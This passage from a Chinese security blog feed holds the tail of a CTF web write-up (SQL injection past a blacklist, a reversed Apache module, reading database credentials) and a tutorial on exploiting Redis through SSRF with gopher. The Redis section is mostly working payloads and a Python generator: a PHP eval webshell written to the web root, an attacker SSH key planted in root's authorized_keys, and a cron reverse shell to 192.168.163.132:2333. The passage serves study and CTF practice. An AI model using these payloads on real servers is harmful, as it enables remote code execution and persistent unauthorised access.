punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">></span></span></span> Give me your flag<span class="token punctuation">,</span> I will tell you <span class="token keyword">if</span> the flag is right<span class="token punctuation">.</span> <span class="token markup">&lt;/ a></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$BlackList</span> <span class="token operator">=</span> <span class="token string">"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\""</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//var_dump(preg_match("/{$BlackList}/is",$post['query']));</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/{$BlackList}/is"</span><span class="token punctuation">,</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//echo $post['query'];</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Nonono."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Too long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select "</span><span class="token punctuation">.</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"||flag from Flag"</span><span class="token punctuation">;</span>        <span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">do</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysqli_store_result</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_row</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span>@<span class="token function">mysqli_next_result</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token delimiter">?></span></code></pre><p>说实话虽然语句看着简单，但是搞了半天没出来，最后队里的师傅解出来了，payload如下：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819221949-67405e10-c28c-1.png" alt="image.png"><br>这个都没想到，还是太菜了呜呜呜，不过这个是非预期解，预期解是将<code>sql_mode</code>改为<code>PIPES_AS_CONCAT</code>，也就是把<code>||</code>变为连接符</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819223150-14cbc5be-c28e-1.png" alt="image.png"></p><p>最终payload如下：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819222951-ce3d405a-c28d-1.png" alt="image.png"></p><h2 id="Cocktail’s-Remix"><a href="#Cocktail’s-Remix" class="headerlink" title="Cocktail’s Remix"></a>Cocktail’s Remix</h2><p>这题是结合逆向的一道题，扫描一下发现有一个下载功能，可以读文件，但是试了一个常规的flag文件路径都读不到flag，猜测flag应该不在目录里面。还有一个<code>info.php</code>也没有发现什么信息，猜测与题目名字有关，info.php里面搜索一下<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819161703-b96e3776-c259-1.png" alt="image.png"></p><p>果真有点东西，把<code>mod_cocktail.so</code>文件下载下来，丢<code>IDA</code>看一下</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819161939-16c6acdc-c25a-1.png" alt="image.png"></p><p>大概意思是获取<code>Reffer</code>头的内容然后传入<code>j_remix</code>后的字符串拿去<code>popen</code>，跟进<code>j_remix</code>看一下，代码如下</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;cstdio></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;cstring></span></span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> remixedchar <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">num_strchr</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">,</span> <span class="token keyword">char</span> c<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  v2 <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>str<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token punctuation">)</span>    result <span class="token operator">=</span> v2 <span class="token operator">-</span> str<span class="token punctuation">;</span>  <span class="token keyword">else</span>    result <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">remix</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>remixed<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>dedata<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// r13</span>  <span class="token keyword">char</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// si</span>  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbx</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbp</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// er14</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST0C_4</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// er14</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// er15</span>  v2 <span class="token operator">=</span> dedata<span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token operator">*</span>remixed<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>remixed <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v4 <span class="token operator">=</span> remixed <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">do</span>    <span class="token punctuation">{</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        v8 <span class="token operator">=</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token function">num_strchr</span><span class="token punctuation">(</span>remixedchar<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>        v9 <span class="token operator">=</span> <span class="token function">num_strchr</span><span class="token punctuation">(</span>remixedchar<span class="token punctuation">,</span> <span class="token operator">*</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>        v2<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> v8 <span class="token operator">|</span> <span class="token punctuation">(</span>v9 <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">61</span> <span class="token punctuation">)</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        v4 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>        v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>v4 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v5 <span class="token operator">=</span> v5 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>v4 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token keyword">goto</span> LABEL_8<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      v6 <span class="token operator">=</span> <span class="token function">num_strchr</span><span class="token punctuation">(</span>remixedchar<span class="token punctuation">,</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v2<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v5 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>v6 <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xF</span> <span class="token operator">|</span> <span class="token number">16</span> <span class="token operator">*</span> v9<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">61</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        v5 <span class="token operator">=</span> v5 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span>      <span class="token punctuation">{</span>        j <span class="token operator">=</span> v5 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>        v5 <span class="token operator">=</span> v5 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">;</span>        v2<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">num_strchr</span><span class="token punctuation">(</span>remixedchar<span class="token punctuation">,</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3F</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v6 <span class="token operator">&lt;&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      v4 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>      v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>v4 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>v4 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>LABEL_8<span class="token punctuation">:</span>    v5 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v5<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    v5 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  v2<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>问了一下队里面的re师傅，说这个是base64，尝试一下发现可以</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819162510-dc15f934-c25a-1.png" alt="image.png"></p><p>但是发现都找不到flag，通过之前扫描出来的<code>config.php</code>，猜测flag应该在数据库里面，读一下config文件得到数据库用户密码</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819162734-31db9194-c25b-1.png" alt="image.png"></p><p><code>show databases</code>一下<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819162955-85c05ce0-c25b-1.png" alt="image.png"></p><p><code>use flag;show tables</code></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819163517-45b571e8-c25c-1.png" alt="image.png"></p><p><code>select * from flag.flag</code></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819163559-5efc045a-c25c-1.png" alt="image.png"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析Redis中SSRF的利用</title>
      <link href="/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/"/>
      <url>/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF介绍"><a href="#SSRF介绍" class="headerlink" title="SSRF介绍"></a>SSRF介绍</h1><p>SSRF，服务器端请求伪造，服务器请求伪造，是由攻击者构造的漏洞，用于形成服务器发起的请求。通常，SSRF攻击的目标是外部网络无法访问的内部系统。这里我们要介绍的是关于<code>redis</code>中SSRF的利用，如果有什么错误的地方还请师傅们不吝赐教/握拳。</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>文章中的数据包构造会涉及到redis的<code>RESP</code>协议，所以我们这里先科普一下，了解RESP协议的师傅可以跳过=。=</p><h2 id="RESP协议"><a href="#RESP协议" class="headerlink" title="RESP协议"></a>RESP协议</h2><p><code>Redis</code>服务器与客户端通过<code>RESP</code>（REdis Serialization Protocol）协议通信。<br>RESP协议是在Redis 1.2中引入的，但它成为了与Redis 2.0中的Redis服务器通信的标准方式。这是您应该在Redis客户端中实现的协议。<br>RESP实际上是一个支持以下数据类型的序列化协议：简单字符串，错误，整数，批量字符串和数组。</p><p>RESP在Redis中用作请求 - 响应协议的方式如下：</p><ol><li>客户端将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器。</li><li>服务器根据命令实现回复一种RESP类型。</li></ol><p>在RESP中，某些数据的类型取决于第一个字节：<br>对于<code>Simple Strings</code>，回复的第一个字节是<code>+</code><br>对于<code>error</code>，回复的第一个字节是<code>-</code><br>对于<code>Integer</code>，回复的第一个字节是<code>:</code><br>对于<code>Bulk Strings</code>，回复的第一个字节是<code>$</code><br>对于<code>array</code>，回复的第一个字节是<code>*</code><br>此外，<code>RESP</code>能够使用稍后指定的<code>Bulk Strings</code>或<code>Array</code>的特殊变体来表示<code>Null</code>值。<br>在RESP中，协议的不同部分始终以<code>"\r\n"(CRLF)</code>结束。</p><p>我们用<code>tcpdump</code>来抓个包来测试一下</p><pre><code>tcpdump port 6379 -w ./Desktop/1.pcap</code></pre><p>redis客户端中执行如下命令</p><pre class=" language-sh"><code class="language-sh">192.168.163.128:6379> set name testOK192.168.163.128:6379> get name"test"192.168.163.128:6379></code></pre><p>抓到的数据包如下</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713085931-794d2d5e-a509-1.png" alt="image.png"><br>hex转储看一下</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713090053-a9d401f0-a509-1.png" alt="image.png"></p><p>正如我们前面所说的，客户端向将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型。<br>我们就拿上面的数据包分析，首先是<code>*3</code>，代表数组的长度为3（可以简单理解为用空格为分隔符将命令分割为[“set”,”name”,”test”]）；<code>$4</code>代表字符串的长度，<code>0d0a</code>即<code>\r\n</code>表示结束符；<code>+OK</code>表示服务端执行成功后返回的字符串</p><h1 id="Redis配合gopher协议进行SSRF"><a href="#Redis配合gopher协议进行SSRF" class="headerlink" title="Redis配合gopher协议进行SSRF"></a>Redis配合gopher协议进行SSRF</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><code>Gopher</code> 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议，不过现在gopher协议用得已经越来越少了<br><code>Gopher</code> 协议可以说是SSRF中的万金油，。利用此协议可以攻击内网的 redis、ftp等等，也可以发送 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><pre><code>能未授权或者能通过弱口令认证访问到Redis服务器</code></pre><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>redis常见的SSRF攻击方式大概有这几种：</p><ol><li><p>绝对路径写webshell</p></li><li><p>写ssh公钥</p></li><li><p>写contrab计划任务反弹shell</p></li></ol><p>下面我们逐个实现</p><h2 id="绝对路径写webshell"><a href="#绝对路径写webshell" class="headerlink" title="绝对路径写webshell"></a>绝对路径写webshell</h2><p>这个方法比较常用，也是用得最多的=。=</p><h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>构造redis命令</p><pre><code>flushallset 1 '&lt;?php eval($_GET["cmd"]);?&gt;'config set dir /var/www/htmlconfig set dbfilename shell.phpsave</code></pre><p>写了一个简单的脚本，转化为redis RESP协议的格式</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllibprotocol<span class="token operator">=</span><span class="token string">"gopher://"</span>ip<span class="token operator">=</span><span class="token string">"192.168.163.128"</span>port<span class="token operator">=</span><span class="token string">"6379"</span>shell<span class="token operator">=</span><span class="token string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?>\n\n"</span>filename<span class="token operator">=</span><span class="token string">"shell.php"</span>path<span class="token operator">=</span><span class="token string">"/var/www/html"</span>passwd<span class="token operator">=</span><span class="token string">""</span>cmd<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"flushall"</span><span class="token punctuation">,</span>     <span class="token string">"set 1 {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>shell<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"${IFS}"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token string">"config set dir {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token string">"config set dbfilename {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token string">"save"</span>     <span class="token punctuation">]</span><span class="token keyword">if</span> passwd<span class="token punctuation">:</span>    cmd<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"AUTH {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>protocol<span class="token operator">+</span>ip<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>port<span class="token operator">+</span><span class="token string">"/_"</span><span class="token keyword">def</span> <span class="token function">redis_format</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">:</span>    CRLF<span class="token operator">=</span><span class="token string">"\r\n"</span>    redis_arr <span class="token operator">=</span> arr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>    cmd<span class="token operator">=</span><span class="token string">""</span>    cmd<span class="token operator">+=</span><span class="token string">"*"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>redis_arr<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> redis_arr<span class="token punctuation">:</span>        cmd<span class="token operator">+=</span>CRLF<span class="token operator">+</span><span class="token string">"$"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"${IFS}"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>CRLF<span class="token operator">+</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"${IFS}"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span>    cmd<span class="token operator">+=</span>CRLF    <span class="token keyword">return</span> cmd<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> cmd<span class="token punctuation">:</span>        payload <span class="token operator">+=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>redis_format<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> payload</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713184952-f1bb74e2-a55b-1.png" alt="image.png"></p><p>生成payload后，用<code>curl</code>打一波</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713184859-d1be7432-a55b-1.png" alt="image.png"></p><p>执行成功，我们看一波shell是否写入成功</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713185023-04486f84-a55c-1.png" alt="image.png"></p><p>成功写入</p><h2 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h2><p>如果<code>.ssh</code>目录存在，则直接写入<code>~/.ssh/authorized_keys</code><br>如果不存在，则可以利用<code>crontab</code>创建该目录</p><h3 id="构造payload-1"><a href="#构造payload-1" class="headerlink" title="构造payload"></a>构造payload</h3><p>构造redis命令</p><pre><code>flushallset 1 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali'config set dir /root/.ssh/config set dbfilename authorized_keyssave</code></pre><p>转化为redis RESP协议的格式<br><strong>PS：将第一个脚本改一下</strong></p><pre class=" language-python"><code class="language-python">filename<span class="token operator">=</span><span class="token string">"authorized_keys"</span>ssh_pub<span class="token operator">=</span><span class="token string">"\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\n\n"</span>path<span class="token operator">=</span><span class="token string">"/root/.ssh/"</span></code></pre><p>生成payload<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713183658-246f246c-a55a-1.png" alt="image.png"><br><code>curl</code>打一波<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713183322-a37e93d8-a559-1.png" alt="image.png"><br>我们来查看一波是否成功写入</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713183413-c1a43818-a559-1.png" alt="image.png"><br>成功写入，尝试连接</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713183504-e0404db6-a559-1.png" alt="image.png"><br>成功连接</p><h2 id="利用contrab计划任务反弹shell"><a href="#利用contrab计划任务反弹shell" class="headerlink" title="利用contrab计划任务反弹shell"></a>利用contrab计划任务反弹shell</h2><p>这个方法只能<code>Centos</code>上使用，<code>Ubuntu上行不通</code>，原因如下：</p><ol><li><p>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600也就是<code>-rw-------</code>才会执行，否则会报错<code>(root) INSECURE MODE (mode 0600 expected)</code>，而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行</p></li><li><p>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</p></li></ol><p>由于系统的不同，crontrab定时文件位置也会不同<br>Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code><br>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;</code><br>Centos和Ubuntu均存在的（需要root权限）<code>/etc/crontab</code> PS：高版本的redis默认启动是<code>redis</code>权限，故写这个文件是行不通的</p><h3 id="构造payload-2"><a href="#构造payload-2" class="headerlink" title="构造payload"></a>构造payload</h3><p>构造redis的命令如下：</p><pre><code>flushallset 1 '\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.163.132/2333 0&gt;&amp;1\n\n'config set dir /var/spool/cron/config set dbfilename rootsave</code></pre><p>转化为redis RESP协议的格式<br><strong>PS：将第一个脚本改一下</strong></p><pre class=" language-python"><code class="language-python">reverse_ip<span class="token operator">=</span><span class="token string">"192.168.163.132"</span>reverse_port<span class="token operator">=</span><span class="token string">"2333"</span>cron<span class="token operator">=</span><span class="token string">"\n\n\n\n*/1 * * * * bash -i >&amp; /dev/tcp/%s/%s 0>&amp;1\n\n\n\n"</span><span class="token operator">%</span><span class="token punctuation">(</span>reverse_ip<span class="token 